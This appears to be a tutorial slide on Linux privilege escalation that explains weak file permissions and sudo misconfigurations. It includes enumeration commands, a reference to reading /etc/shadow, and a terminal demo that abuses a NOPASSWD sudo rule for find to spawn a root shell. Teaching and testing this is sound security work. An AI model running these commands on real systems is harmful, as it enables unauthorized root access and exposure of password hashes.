Weak Permissions and Sudo Misconfigurations

Exploiting file system and sudoer file weaknesses

Weak File Permissions

  • Overly permissive permissions on sensitive files/directories.
  • Example: /etc/shadow readable by non-root users.
  • Can expose hashed passwords or allow unauthorized modification.
  • Enumeration: ls -l /etc/shadow

Sudo Misconfigurations

  • User can run specific commands as root without a password.
  • Dangerous commands allowed (e.g., sudo /usr/bin/find . -exec /bin/sh \;).
  • Enumeration: sudo -l
  • Also consider cron jobs and unpatched software.
Terminal Demo: Checking Sudo Privileges
lowuser@target:~$ sudo -l
Matching Defaults entries for lowuser on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin...

User lowuser may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/apt update
    (root) NOPASSWD: /usr/bin/find

# Exploiting find:
lowuser@target:~$ sudo find . -exec /bin/sh \; -quit
root@target:/home/lowuser# id
uid=0(root) gid=0(root) groups=0(root),1000(lowuser)

A misconfigured sudo rule for 'find' can be exploited to gain a root shell.

Key Takeaway

Always enumerate file permissions and `sudo` configurations on Linux, as these common misconfigurations are frequently exploited for privilege escalation.
